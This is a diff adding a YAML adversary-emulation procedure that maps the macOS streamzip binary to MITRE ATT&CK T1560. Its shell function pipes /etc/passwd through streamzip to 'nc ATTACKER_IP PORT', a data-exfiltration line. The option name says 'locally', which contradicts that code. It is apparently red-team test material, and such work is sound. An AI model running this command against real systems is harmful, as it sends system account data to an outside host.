@@ -1,0 +1,48 @@
+procedure_name: streamzip
+tactic: Collection
+ttp_id: T1560
+guid: cd29675b-6660-4f8d-aa3f-c31ff6d15743
+intent: File-less compression of data passed in through stdin. Sourced from LOOBins;
+  confirm MITRE mapping for each enabled option.
+author: Gabriel De Jesus (0xv1n)
+created: '2024-07-15'
+updated: '2026-05-03'
+version: 1.0.4
+platform:
+- darwin
+detection: []
+resources:
+- link: https://www.loobins.io/
+  description: "LOOBins \u2014 Living Off The Orchard macOS binaries"
+- link: https://attack.mitre.org/techniques/T1560/
+  description: "MITRE ATT&CK \u2014 T1560"
+- link: ''
+  description: ''
+- link: https://docs.oracle.com/cd/E88353_01/html/E37839/streamzip-1.html
+  description: streamzip man page
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --copy-and-compress-sensitive-data-locally
+    description: The following command reads file data and compresses the data for
+      exfiltration
+    execute_function:
+    - execute_copy_compress_sensitive_data_locally
+  global_variable:
+  - name: CMD_STREAMZIP
+    type: string
+    default_value: /usr/bin/streamzip
+  functions:
+  - name: execute_copy_compress_sensitive_data_locally
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_copy_compress_sensitive_data_locally() {\n    local result\n  \
+      \  result=$(dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT 2>&1)\n\
+      \    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
